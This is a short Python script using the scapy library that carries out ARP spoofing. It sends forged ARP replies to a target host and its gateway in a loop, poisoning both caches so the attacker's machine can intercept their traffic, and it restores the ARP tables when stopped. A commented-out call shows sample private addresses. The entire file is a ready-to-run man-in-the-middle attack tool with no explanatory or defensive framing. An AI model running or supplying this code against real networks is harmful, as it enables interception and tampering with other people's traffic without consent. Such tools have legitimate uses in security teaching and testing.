# arp_spoof.py
import scapy.all as scapy
import time

stop_spoofing = False

def spoof(target_ip, spoof_ip):
    target_mac = scapy.getmacbyip(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = scapy.getmacbyip(destination_ip)
    source_mac = scapy.getmacbyip(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

def start_spoofing(ip_target, ip_gateway, interval=4):
    global stop_spoofing
    stop_spoofing = False  # Reset flag at start
    try:
        print(f"Starting ARP spoofing with target: {ip_target} and gateway: {ip_gateway}")
        while not stop_spoofing:
            spoof(ip_target, ip_gateway)
            spoof(ip_gateway, ip_target)
            time.sleep(interval)
    except KeyboardInterrupt:
        pass  # Handle keyboard interrupt gracefully
    finally:
        print("Restoring the Default ARP Table...")
        restore(ip_gateway, ip_target)
        restore(ip_target, ip_gateway)
        print("Attack stopped.")

def stop():
    global stop_spoofing
    stop_spoofing = True


#start_spoofing("192.168.1.2", "192.168.1.1")
